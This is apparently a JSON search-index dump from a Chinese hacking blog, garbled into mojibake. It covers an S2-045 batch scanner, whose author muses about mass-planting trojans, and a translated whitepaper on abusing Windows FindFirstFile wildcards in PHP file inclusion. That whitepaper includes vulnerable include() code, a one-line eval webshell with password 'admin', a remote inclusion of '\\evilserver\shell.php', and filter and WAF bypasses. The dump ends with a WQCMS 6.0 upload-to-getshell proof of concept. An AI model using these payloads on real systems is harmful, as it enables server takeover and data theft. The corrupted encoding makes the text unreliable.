ä¸‹è½½åœ°å€\næ‰“åŒ…äº†winç‰ˆï¼Œå¤§å®¶å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚åœ¨è¯¥exeç›®å½•ä¸‹æ‰§è¡Œ~~ï¼ˆæ›´æ–°çš„å¹¶æœªæ‰“åŒ…å‡ºexeï¼Œå¦‚æœ‰éœ€è¦å¯ä»¥è‡ªè¡Œç”¨pyinstalleræ‰“åŒ…ï¼‰~~\n1 s2-045.exe 9 10 å…¶ä»–ç”¨æ³•å‚ç…§ä¸Šé¢ è½¬è½½è¯·æ³¨æ˜å‡ºå¤„\n","permalink":"https://www.hacktech.cn/post/st2-045-batch-test-tool.html","summary":"\u003cp\u003eä»Šå¤©æ™šä¸Šçœ‹è€é“ä»¬åœ¨ç¾¤é‡Œå°±è¿™ä¸ªst2-045æ¼æ´è®¨è®ºå¾—ç«çƒ­ï¼Œä¸ªäººä¸å¤ªå–œæ¬¢æ—¥ç«™ï¼Œæœ¬æ¥æƒ³ç›´æ¥å†™ä¸ªæ‰¹é‡æŒ‚é©¬çš„ä¸œè¥¿ï¼Œä½†æ˜¯æƒ³æƒ³è¿˜æ˜¯ç®—äº†ï¼Œå¦‚æœä½ æœ‰å…´è¶£ï¼Œæ”¹æ”¹ä¹Ÿå¾ˆå®¹æ˜“ï¼Œåæ­£ä¸å…³æˆ‘çš„äº‹\u003c/p\u003e\n\u003cp\u003eæµ‹è¯•å›¾\n\u003cimg loading=\"lazy\" src=\"https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png\" alt=\"TIMå›¾ç‰‡20170307212124.png\"  /\u003e\n\u003c/p\u003e","title":"s2-045æ¼æ´æ‰¹é‡æ£€æµ‹å·¥å…·"},{"content":"ç›®å‰å¤§å¤šæ•°ç¨‹åºéƒ½ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶ååŠ å…¥æ—¶é—´æˆ³ç­‰å­—ç¬¦å†è¿›è¡ŒMD5ï¼Œç„¶åä¸‹è½½æ–‡ä»¶çš„æ—¶å€™é€šè¿‡ä¿å­˜åœ¨æ•°æ®åº“é‡Œçš„æ–‡ä»¶IDè¯»å–æ–‡ä»¶è·¯å¾„ï¼Œä¸€æ ·ä¹Ÿå®ç°äº†æ–‡ä»¶ä¸‹è½½ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— æ³•ç›´æ¥å¾—åˆ°æˆ‘ä»¬ä¸Šä¼ çš„webshellæ–‡ä»¶è·¯å¾„ï¼Œä½†æ˜¯å½“åœ¨Windowsä¸‹æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œç„¶ååˆ©ç”¨Windowsçš„ç‰¹æ€§å°±å¯ä»¥è®¿é—®åˆ°æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºWindowsåœ¨æœç´¢æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨äº†FindFirstFileè¿™ä¸€ä¸ªwinapiå‡½æ•°ï¼Œè¯¥å‡½æ•°åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹(åŒ…å«å­æ–‡ä»¶å¤¹)å»æœç´¢æŒ‡å®šæ–‡ä»¶ã€‚\nåˆ©ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªè¦å°†æ–‡ä»¶åä¸å¯çŸ¥éƒ¨åˆ†ä¹‹åçš„å­—ç¬¦ç”¨\u0026quot;\u0026lt;\u0026ldquo;æˆ–è€…\u0026rdquo;\u0026gt;\u0026ldquo;ä»£æ›¿å³å¯ï¼Œä¸è¿‡è¦æ³¨æ„ä¸€ç‚¹æ˜¯ï¼Œåªä½¿ç”¨ä¸€ä¸ª\u0026rdquo;\u0026lt;\u0026ldquo;æˆ–è€…\u0026rdquo;\u0026gt;\u0026ldquo;åˆ™åªèƒ½ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœæ–‡ä»¶åæ˜¯12345æˆ–è€…æ›´é•¿ï¼Œè¿™æ—¶å€™è¯·æ±‚\u0026quot;1\u0026lt;\u0026ldquo;æˆ–è€…\u0026quot;1\u0026gt;\u0026ldquo;éƒ½æ˜¯è®¿é—®ä¸åˆ°æ–‡ä»¶çš„ï¼Œéœ€è¦\u0026quot;1\u0026laquo;\u0026ldquo;æ‰èƒ½è®¿é—®åˆ°ï¼Œä»£è¡¨ç»§ç»­å¾€ä¸‹æœç´¢ï¼Œæœ‰ç‚¹åƒWindowsçš„çŸ­æ–‡ä»¶åï¼Œè¿™æ ·æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥çˆ†ç ´ç›®å½•æ–‡ä»¶äº†ã€‚\næˆ‘ä»¬æ¥åšä¸ªç®€å•çš„æµ‹è¯•ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 //1.php \u0026lt;?php include($_GET[\u0026#39;file\u0026#39;]); ?\u0026gt; å†åœ¨åŒç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶åä¸º\u0026quot;123456.txt\u0026quot;çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºphpinfo()å‡½æ•°ï¼Œè¯·æ±‚/1.php?file=1\u0026lt;\u0026lt;å³å¯åŒ…å«ã€‚ å¸¸ç”¨çš„æ¼æ´ä»£ç  1 1 2 3 4 5 6 7 \u0026lt;?php if(isset($_GET[page])) { include($_GET[page]); }else{ include \u0026#39;show.php\u0026#39;; } ?\u0026gt; 2 1 2 3 4 5 6 7 \u0026lt;?php if(isset($_GET[page])) { include(\u0026#39;./action/\u0026#39; . $_GET[page]); }else{ include \u0026#39;./action/show.php\u0026#39;; } ?\u0026gt; 3 1 2 3 4 5 6 7 \u0026lt;?php if(isset($_GET[page])) { include(\u0026#39;./action/\u0026#39;. $_GET[page] . \u0026#39;.php\u0026#39;); }else{ include \u0026#39;./action/show.php\u0026#39;; } ?\u0026gt; ç›¸å…³ä»£ç ï¼š phpä¸­ä»£ç ï¼š 1 2 3 \u0026lt;?php include($_GET[\u0026#39;file\u0026#39;]); ?\u0026gt; 123456.txtä¸­ä»£ç ï¼š 1 \u0026lt;?php phpinfo() ?\u0026gt; 123456.TXTé‡Œé¢å¯ä»¥æ¢æˆä¸€å¥è¯æœ¨é©¬ï¼Œä»£ç ï¼š 1 \u0026lt;?php eval($_POST[\u0026#34;admin\u0026#34;]) ?\u0026gt; url:http://127.0.0.1/1.php?file=12\u0026laquo; å¯†ç ï¼šadmin æ³¨æ„ï¼štxté‡Œé¢ä¹¦å†™phpä»£ç ä¸èƒ½æ¢è¡Œå†™ï¼Œæœ€å¥½æ˜¯åœ¨åŒä¸€è¡Œä¹¦å†™ã€åŸå› å¾…æŸ¥æ˜ã€‘\nwindowsçš„æ–‡ä»¶ç³»ç»Ÿæœºåˆ¶å¼•å‘çš„PHPè·¯å¾„çˆ†ç ´é—®é¢˜åˆ†æ å¼€åœºç™½ æ­¤æ¬¡æ‰€æŠ«éœ²çš„æ˜¯ä»¥ä¸‹ç½‘é¡µä¸­æå‡ºçš„é—®é¢˜æ‰€å–å¾—çš„æµ‹è¯•ç»“æœï¼š\nhttp://code.google.com/p/pasc2at/wiki/SimplifiedChinese\n1 2 3 4 5 6 7 \u0026lt;?php for ($i=0; $i\u0026lt;255; $i++) { $url = \u0026#39;1.ph\u0026#39; . chr($i); $tmp = @file_get_contents($url); if (!empty($tmp)) echo chr($i) . \u0026#34; \u0026#34;; } ?\u0026gt; å·²çŸ¥1.phpå­˜åœ¨ï¼Œä»¥ä¸Šè„šæœ¬è®¿é—®çš„ç»“æœæ˜¯ï¼š\n1 2 3 4 1.php 1.phP 1.ph\u0026lt; 1.ph\u0026gt; éƒ½èƒ½å¾—åˆ°è¿”å›ã€‚ å‰ä¸¤ç§èƒ½è¿”å›ç»“æœæ˜¯æ€»æ‰€å‘¨çŸ¥çš„ï¼ˆå› ä¸ºwindowsçš„æ–‡ä»¶ç³»ç»Ÿæ”¯æŒå¤§å°çš„äº’è½¬çš„æœºåˆ¶ï¼‰ï¼Œå¦å¤–çš„ä¸¤ç§è¿”å›å¼•èµ·äº†æˆ‘ä»¬çš„æ³¨æ„ã€‚\næµ‹è¯•phpç‰ˆæœ¬ï¼šPHP4.9,PHP5.2,PHP5.3,PHP6.0\næµ‹è¯•ç³»ç»Ÿï¼šWINXP SP3 X32,WINXP SP2 X64ï¼ŒWIN7,WIN2K3\nç»æµ‹è¯•æˆ‘ä»¬å¾—å‡ºçš„ç»“è®ºæ˜¯ï¼šè¯¥æ¼æ´å½±å“æ‰€æœ‰çš„windows+phpç‰ˆæœ¬\næ·±å…¥æ¢æŸ¥æ¨¡ç³Šæµ‹è¯•çš„ç»“æœ ä¸ºäº†ç»§ç»­æ·±å…¥æ¢æŸ¥å…³äºè¯¥bugçš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯¹demoåšäº†äº›è®¸ä¿®æ”¹:\n1 2 3 4 5 6 7 8 9 \u0026lt;?php for ($j=0; $i\u0026lt;256; $j++) { for ($i=0; $i\u0026lt;256; $i++) { $url = \u0026#39;1.p\u0026#39; . chr($j) . chr($i); $tmp = @file_get_contents($url); if (!empty($tmp)) echo chr($j) . chr($i) . \u0026#34; \u0026#34;; } } ?\u0026gt; åœ¨è°ƒè¯•phpè§£é‡Šå™¨çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†æ­¤â€œç¥å¥‡â€çš„æ¼æ´å½’ç»“ä¸ºä¸€ä¸ªWinapi å‡½æ•°FindFirstFile(ï¼‰æ‰€äº§ç”Ÿçš„ç»“æœ(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx).æ›´å¥½ç©çš„æ˜¯ï¼Œå½“è·Ÿè¸ªå‡½æ•°è°ƒç”¨æ ˆçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å‘ç°å­—ç¬¦â€\u0026gt;â€è¢«æ›¿æ¢æˆâ€?â€ï¼Œå­—ç¬¦â€\u0026lt;â€è¢«æ›¿æ¢æˆâ€*â€ï¼Œè€Œç¬¦å·â€ï¼ˆåŒå¼•å·ï¼‰è¢«æ›¿æ¢æˆä¸€ä¸ªâ€.â€å­—ç¬¦ã€‚è¿™åœ¨2007å¹´msdnå…¬å¼€çš„æ–‡æ¡£ä¸­è¢«æåŠï¼šhttp://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3\nä½†æ˜¯æ­¤bugè‡³ä»Šæœªè¢«ä»»ä½•windowsæ——ä¸‹æ‰€å‘è¡Œçš„ä»»ä½•ç‰ˆæœ¬ä¿®å¤!\næˆ‘ä»¬è¦é˜æ˜çš„æ˜¯ï¼Œè¯¥å‡½æ•°FindFirstFile()åœ¨phpä¸‹çš„è¿ç”¨è¿œè¿œä¸è‡³äºfile_get_contents().å…³äºè¯¥bugå¯ä»¥åˆ©ç”¨çš„å‡½æ•°æˆ‘ä»¬å·²ç»åˆ—äº†å¦‚ä¸‹ä¸€è¡¨ï¼š\næ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å‘ç°è¯¥åˆ©ç”¨ä¹Ÿå¯ä»¥è¢«è¿ç”¨åˆ°c++ä¸­ï¼Œä»¥ä¸‹é‡‡ç”¨æ¥è‡ªmsdnçš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; void _tmain(int argc, TCHAR *argv[]){ WIN32_FIND_DATA FindFileData; HANDLE hFind; if( argc != 2 ){ _tprintf(TEXT(\u0026#34;Usage: %s [target_file] \u0026#34;), argv[0]); return; } _tprintf (TEXT(\u0026#34;Target file is %s \u0026#34;), argv[1]); hFind = FindFirstFile(argv[1], \u0026amp;FindFileData); if (hFind == INVALID_HANDLE_VALUE){ printf (\u0026#34;FindFirstFile failed (%d) \u0026#34;, GetLastError()); return; }else{ _tprintf (TEXT(\u0026#34;The first file found is %s \u0026#34;), FindFileData.cFileName); FindClose(hFind); } } å½“ä¼ å…¥å‚æ•°â€c:o\u0026lt;â€æ—¶ï¼ŒæˆåŠŸè®¿é—®åˆ°boot.iniæ–‡ä»¶ã€‚\nåˆ©ç”¨æ–¹æ³•æ€»ç»“ å½“è°ƒç”¨FindFirstFile()å‡½æ•°æ—¶ï¼Œâ€\u0026lt;â€è¢«æ›¿æ¢æˆâ€ * â€,è¿™æ„å‘³è¯¥è§„åˆ™å¯ä»¥ä½¿â€\u0026lt;â€æ›¿æ¢å¤šä¸ªä»»æ„å­—ç¬¦ï¼Œä½†æ˜¯æµ‹è¯•ä¸­å‘ç°å¹¶ä¸æ˜¯æ‰€æœ‰æƒ…å†µéƒ½å¦‚æˆ‘ä»¬æ‰€æ„¿ã€‚æ‰€ä»¥ï¼Œä¸ºäº†ç¡®ä¿èƒ½å¤Ÿä½¿â€\u0026lt;â€è¢«æ›¿æ¢æˆâ€*â€,åº”å½“é‡‡ç”¨â€\u0026laquo;â€ 1 EXAMPLE:include(â€˜shell\u0026lt;\u0026#39;); æˆ–è€…include(â€˜shell\u0026lt;\u0026lt;\u0026#39;); //å½“æ–‡ä»¶å¤¹ä¸­è¶…è¿‡ä¸€ä¸ªä»¥shellæ‰“å¤´çš„æ–‡ä»¶æ—¶ï¼Œè¯¥æ‰§è¡Œå–æŒ‰å­—æ¯è¡¨æ’åºåçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚ å½“è°ƒç”¨FindFirstFile()å‡½æ•°æ—¶ï¼Œâ€\u0026gt;â€è¢«æ›¿æ¢æˆâ€?â€,è¿™æ„å‘³è¿™â€\u0026gt;â€å¯ä»¥æ›¿æ¢å•ä¸ªä»»æ„å­—ç¬¦ 1 EXAMPLEï¼šinclude(â€˜shell.p\u0026gt;p\u0026#39;); //å½“æ–‡ä»¶ä¸­è¶…è¿‡ä¸€ä¸ªä»¥shell.p?p é€šé…æ—¶ï¼Œè¯¥æ‰§è¡Œå–æŒ‰å­—æ¯è¡¨æ’åºåçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚ å½“è°ƒç”¨FindFirstFile()å‡½æ•°æ—¶ï¼Œâ€â€â€(åŒå¼•å·)è¢«æ›¿æ¢æˆâ€.â€ 1 EXAMPLE:include(â€˜shellâ€php\u0026#39;); //===\u0026gt;include(â€˜shell.php\u0026#39;); å¦‚æœæ–‡ä»¶åç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯â€.â€çš„è¯ï¼Œè¯»å–æ—¶å¯ä»¥å¿½ç•¥ä¹‹ 1 EXAMPLEï¼šfopen(â€˜.htacess\u0026#39;); //==\u0026gt;fopen(â€˜htacess\u0026#39;); //åŠ ä¸Šç¬¬ä¸€ç‚¹ä¸­çš„åˆ©ç”¨ ==\u0026gt;fopen(â€˜h\u0026lt;\u0026lt;\u0026#39;); æ–‡ä»¶åæœ«å°¾å¯ä»¥åŠ ä¸Šä¸€ç³»åˆ—çš„/æˆ–è€…çš„åˆé›†ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨/æˆ–è€…ä¸­é—´åŠ ä¸Š.å­—ç¬¦ï¼Œåªè¦ç¡®ä¿æœ€åä¸€ä½ä¸ºâ€.â€ 1 EXAMPLEï¼šfopen(â€œconfig.ini\\.// ///.â€);==\u0026gt; fopen(â€˜config.ini./..\u0026#39;); ==\u0026gt;fopen(â€˜config.ini/////.\u0026#39;)==\u0026gt;fopen(â€˜config.iniâ€¦..\u0026#39;) //è¯‘è€…æ³¨ï¼šæ­¤å¤„çš„åˆ©ç”¨æˆ‘ä¸æ˜¯å¾ˆç†è§£ï¼Œæœ‰ä½•ä½œç”¨ï¼Ÿæˆªæ–­ï¼Ÿ è¯¥å‡½æ•°ä¹Ÿå¯ä»¥è°ƒç”¨ä»¥â€\\â€æ‰“å¤´çš„ç½‘ç»œå…±äº«æ–‡ä»¶ï¼Œå½“ç„¶è¿™ä¼šè€—è´¹ä¸çŸ­çš„æ—¶é—´ã€‚è¡¥å……ä¸€ç‚¹ï¼Œå¦‚æœå…±äº«åä¸å­˜åœ¨æ—¶ï¼Œè¯¥æ–‡ä»¶æ“ä½œå°†ä¼šé¢å¤–è€—è´¹4ç§’é’Ÿçš„æ—¶é—´ï¼Œå¹¶å¯èƒ½è§¦å‘æ—¶é—´å“åº”æœºåˆ¶ä»¥åŠmax_execution_timeæŠ›é”™ã€‚æ‰€å¹¸çš„æ˜¯ï¼Œè¯¥åˆ©ç”¨å¯ä»¥ç”¨æ¥ç»•è¿‡allow_url_fopen=Off å¹¶æœ€ç»ˆå¯¼è‡´ä¸€ä¸ªRFIï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰ 1 EXAMPLEï¼šinclude (â€˜\\evilservershell.php\u0026#39;); ç”¨ä»¥ä¸‹æ–¹æ³•è¿˜å¯ä»¥åˆ‡æ¢æ–‡ä»¶çš„ç›˜å 1 include(â€˜\\.C:myfile.php......D:anotherfile.php\u0026#39;); é€‰æ‹©ç£ç›˜å‘½åè¯­æ³•å¯ä»¥ç”¨æ¥ç»•è¿‡æ–œçº¿å­—ç¬¦è¿‡æ»¤ 1 file_get_contents(â€˜C:boot.ini\u0026#39;); //==\u0026gt; file_get_contents (â€˜C:/boot.ini\u0026#39;); åœ¨phpçš„å‘½ä»¤è¡Œç¯å¢ƒä¸‹ï¼ˆphp.exeï¼‰,å…³äºç³»ç»Ÿä¿ç•™åæ–‡ä»¶çš„åˆ©ç”¨ç»†èŠ‚ 1 2 3 EXAMPLE:file_get_contents(â€˜C:/tmp/con.jpg\u0026#39;); //æ­¤ä¸¾å°†ä¼šæ— ä¼‘æ— æ­¢åœ°ä»CONè®¾å¤‡è¯»å–0å­—èŠ‚ï¼Œç›´åˆ°é‡åˆ°eof EXAMPLE:file_put_contents(â€˜C:/tmp/con.jpg\u0026#39;,chr(0Ã—07)); //æ­¤ä¸¾å°†ä¼šä¸æ–­åœ°ä½¿æœåŠ¡å™¨å‘å‡ºç±»ä¼¼å“”å“”çš„å£°éŸ³ æ›´æ·±å…¥çš„åˆ©ç”¨æ–¹æ³• é™¤äº†ä»¥ä¸Šå·²ç»å±•ç¤ºçš„æ–¹æ³•ï¼Œä½ å¯ä»¥ç”¨ä¸‹é¢çš„å§¿åŠ¿æ¥ç»•è¿‡WAFæˆ–è€…æ–‡ä»¶åè¿‡æ»¤\nè¯·æ€è€ƒè¯¥ä¾‹ï¼š\n1 2 3 4 \u0026lt;?php file_get_contents(\u0026#34;/images/\u0026#34;.$_GET[\u0026#39;a\u0026#39;].\u0026#34;.jpg\u0026#34;); //or another function from Table 1, i.e. include(). ?\u0026gt; è®¿é—®test.php?a=../a\u0026lt;%00\nå¯èƒ½å‡ºç°ä¸¤ç§ç»“æœ\nWarning: include(/images/../a\u0026lt;) [function.include]: failed to open stream:Invalid argument inã€‚ã€‚ã€‚\nWarning: include(/images/../a\u0026lt;) [function.include]: failed to open stream:Permission deniedã€‚ã€‚\nå¦‚æœæ˜¯ç¬¬ä¸€ç§æƒ…å†µï¼Œè¯´æ˜ä¸å­˜åœ¨aæ‰“å¤´çš„æ–‡ä»¶ï¼Œç¬¬äºŒç§åˆ™å­˜åœ¨ã€‚\næ­¤å¤–ï¼Œæœ‰è®°å½•æ˜¾ç¤ºï¼Œæœ‰æ—¶ç½‘ç«™ä¼šæŠ›å‡ºå¦‚ä¸‹é”™è¯¯ï¼š\n1 Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied.. è¿™è¯´æ˜è¯¥æ–‡ä»¶å¤¹ä¸‹å­˜åœ¨ä¸€ä¸ªä»¥ä¸Šä»¥aæ‰“å¤´çš„æ–‡ä»¶ï¼ˆå¤¹ï¼‰ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå°±æ˜¯admin_h1d3ã€‚\nç»“è®º å®éªŒå‘Šè¯‰æˆ‘ä»¬ï¼Œphpæœ¬èº«æ²¡æœ‰é‚£ä¹ˆå¤šçš„æ¼æ´ï¼Œæˆ‘ä»¬æ‰€çœ‹åˆ°æ˜¯ï¼šè¿‡åˆ†çš„ä¾èµ–äºå¦ä¸€ç§ç¨‹åºè¯­è¨€ï¼ˆæ³¨ï¼šå¦‚æ–‡ä¸­çš„æ¼æ´äº§è‡ªä¸winapiçš„ä¸€ä¸ªBUGï¼‰ï¼Œå¹¶ä¸”ç›´æ¥å¼º åˆ¶ä½¿ç”¨ï¼Œå°†ä¼šå¯¼è‡´ç»†å¾®çš„é”™è¯¯(bug)ï¼Œå¹¶æœ€ç»ˆé€ æˆå±å®³(vul).è¿™æ ·ä¾¿æ‹“å®½äº†æ¨¡ç³Šæµ‹è¯•çš„èŒƒç•´ï¼ˆè¯‘è€…æ³¨ï¼šå¹¶ä¸ä»…ä»…å»ç ”ç©¶webå±‚é¢ï¼Œè€Œæ·±å…¥åˆ°ç³»ç»Ÿåº•å±‚ï¼‰ï¼Œå¹¶æœ€ç»ˆå¯¼è‡´IDSï¼ŒIPSçš„è§„åˆ™æ›´æ–°ã€‚è¯šç„¶ï¼Œä»£ç éœ€è¦ä¿æŠ¤ï¼Œéœ€è¦è¡¥ä¸ï¼Œéœ€è¦å‡çº§ä¸æ‰©å……ã€‚ä½†æ˜¯ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬çœŸæ­£è¦å»å…³æ³¨çš„é—®é¢˜ã€‚åœ¨å½“ä¸‹ï¼Œæˆ‘è®¤ä¸ºæˆ‘ä»¬ æ›´è°¨æ…åœ°å»ä¹¦å†™æ›´å¤šæ›´ä¸¥å‰çš„è¿‡æ»¤è§„åˆ™ï¼Œæ­£å¦‚æˆ‘ä»¬ä¸€ç›´åœ¨åšçš„ä¸€æ ·ã€‚ä»»é‡é“è¿œï¼Œç²¾ç›Šæ±‚ç²¾ã€‚\nå› ä¸ºè¿™æ˜¯åŸºç¡€åº”ç”¨å±‚çš„é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬çŒœæƒ³ç±»ä¼¼çš„é—®é¢˜å¯èƒ½å‡ºç°åœ¨å…¶ä»–webåº”ç”¨ä¸­ã€‚äºæ˜¯æˆ‘ä»¬è¿˜æµ‹è¯•äº†mysql5,è€Œå®éªŒç»“æœè¡¨æ˜ï¼Œmysql5å¹¶ä¸å­˜åœ¨ç±»ä¼¼çš„æ¼æ´ã€‚ä½†æ˜¯æˆ‘ä»¬ä»è®¤ä¸ºï¼šç±»ä¼¼çš„æ¼æ´å°†ä¼šå‡ºç°åœ¨è¯¸å¦‚Perlã€Pythonã€Rubyç­‰è§£é‡Šæ€§è¯­è¨€ä¸Šã€‚\nReferer PHP application source code audits advanced technology:\nhttp://code.google.com/p/pasc2at/wiki/SimplifiedChinese\nMSDN FindFirstFile Function reference:\nhttp://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx\nMSDN comments history:\nhttp://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3\nMSDN article Â«Naming Files, Paths, and NamespacesÂ»:\nhttp://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx\nTechnet article Â«Managing Files and DirectoriesÂ»:\nhttp://technet.microsoft.com/en-us/library/cc722482.aspx\nPaper Â«Technique of quick exploitation of 2blind SQL InjectionÂ»:\nhttp://www.exploit-db.com/papers/13696/\nå…¨æ–‡å®Œã€‚\næ³¨ï¼šè¯¥æ–‡æ˜¯2011å¹´åº•å‘è¡¨çš„ä¸€ç¯‡ç™½çš®ä¹¦ï¼Œè‡³ä»Šè¯¥bugä¾ç„¶å­˜åœ¨ã€‚æˆ‘åœ¨å‡ ä¸ªæœˆå‰åšCUITçš„ä¸€ä¸ªCTFæ—¶å¶é‡äº†ä¸€é“è¯¥bugçš„åˆ©ç”¨ï¼Œå½“æ—¶ä¾¿æ˜¯çœ‹çš„æ­¤æ–‡ï¼Œå½“æ—¶åªæ˜¯ç²—ç²—è¯»äº†ä¸€ä¸‹ï¼Œå†™äº†ä¸€ä¸ªphpçš„è„šæœ¬å»è·‘ç›®å½•ã€‚ä»Šå›é—²æ¥æ— äº‹ï¼Œç¿»è¯‘æ•´ç†äº†ä¸€ç•ªã€‚\næ–‡ç« è½¬è‡ªç¾¤å‹\nç‰ˆæƒå£°æ˜ï¼š æ–‡ç« æ‰€è®¾è®¡å†…å®¹åŒ…æ‹¬ä¸¤éƒ¨åˆ† ä¸€æ˜¯æ³•å¸ˆçš„ä¹¦ç±ã€Šä»£ç å®¡è®¡-ä¼ä¸šçº§webä»£ç å®‰å…¨æ¶æ„ã€‹ äºŒæ˜¯æ¥è‡ªç¾¤å‹@evil7æä¾›çš„èµ„æ–™ ä»¥ä¸‹ä¸ºèµ„æ–™åŸæ–‡ï¼š http://www.169it.com/blog_article/2302639890.html https://code.google.com/archive/p/pasc2at/wikis/SimplifiedChinese.wiki\n","permalink":"https://www.hacktech.cn/post/windows-findfirst-exploit.html","summary":"\u003cp\u003eç›®å‰å¤§å¤šæ•°ç¨‹åºéƒ½ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶ååŠ å…¥æ—¶é—´æˆ³ç­‰å­—ç¬¦å†è¿›è¡ŒMD5ï¼Œç„¶åä¸‹è½½æ–‡ä»¶çš„æ—¶å€™é€šè¿‡ä¿å­˜åœ¨æ•°æ®åº“é‡Œçš„æ–‡ä»¶IDè¯»å–æ–‡ä»¶è·¯å¾„ï¼Œä¸€æ ·ä¹Ÿå®ç°äº†æ–‡ä»¶ä¸‹è½½ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ— æ³•ç›´æ¥å¾—åˆ°æˆ‘ä»¬ä¸Šä¼ çš„webshellæ–‡ä»¶è·¯å¾„ï¼Œä½†æ˜¯å½“åœ¨Windowsä¸‹æ—¶ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œç„¶ååˆ©ç”¨Windowsçš„ç‰¹æ€§å°±å¯ä»¥è®¿é—®åˆ°æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºWindowsåœ¨æœç´¢æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨äº†FindFirstFileè¿™ä¸€ä¸ªwinapiå‡½æ•°ï¼Œè¯¥å‡½æ•°åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹(åŒ…å«å­æ–‡ä»¶å¤¹)å»æœç´¢æŒ‡å®šæ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eåˆ©ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªè¦å°†æ–‡ä»¶åä¸å¯çŸ¥éƒ¨åˆ†ä¹‹åçš„å­—ç¬¦ç”¨\u0026quot;\u0026lt;\u0026ldquo;æˆ–è€…\u0026rdquo;\u0026gt;\u0026ldquo;ä»£æ›¿å³å¯ï¼Œä¸è¿‡è¦æ³¨æ„ä¸€ç‚¹æ˜¯ï¼Œåªä½¿ç”¨ä¸€ä¸ª\u0026rdquo;\u0026lt;\u0026ldquo;æˆ–è€…\u0026rdquo;\u0026gt;\u0026ldquo;åˆ™åªèƒ½ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœæ–‡ä»¶åæ˜¯12345æˆ–è€…æ›´é•¿ï¼Œè¿™æ—¶å€™è¯·æ±‚\u0026quot;1\u0026lt;\u0026ldquo;æˆ–è€…\u0026quot;1\u0026gt;\u0026ldquo;éƒ½æ˜¯è®¿é—®ä¸åˆ°æ–‡ä»¶çš„ï¼Œéœ€è¦\u0026quot;1\u0026laquo;\u0026ldquo;æ‰èƒ½è®¿é—®åˆ°ï¼Œä»£è¡¨ç»§ç»­å¾€ä¸‹æœç´¢ï¼Œæœ‰ç‚¹åƒWindowsçš„çŸ­æ–‡ä»¶åï¼Œè¿™æ ·æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥çˆ†ç ´ç›®å½•æ–‡ä»¶äº†ã€‚\u003c/p\u003e","title":"Windows FindFirstFileåˆ©ç”¨"},{"content":"2017-02-15å‘å¸ƒ\nä¸€ã€æ¼æ´åˆ©ç”¨ç‚¹ æ¼æ´æ–‡ä»¶:admin_UploadDataHandler.ashx è‡ªå®šä¹‰æ„é€ ä¸Šä¼ ç‚¹\näºŒã€hack it ä¸‰ã€POC 1 2 3 4 5 6 7 8 9 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;http://127.0.0.1/admin_UploadDataHandler.ashx\u0026#34; method=\u0026#34;POST\u0026#34;enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;uploadify\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;saveFile\u0026#34; value=\u0026#34;admin\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;Upload\u0026#34; value=\u0026#34;Submit Query\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è½¬è‡ªç¾¤å‹è®ºå›æ–‡ç« wobushou\n","permalink":"https://www.hacktech.cn/post/wqcms6.0%E5%9C%A8iis6%E7%9A%84getshell.html","summary":"\u003cp\u003e2017-02-15å‘å¸ƒ\u003c/p\u003e\n\u003ch1 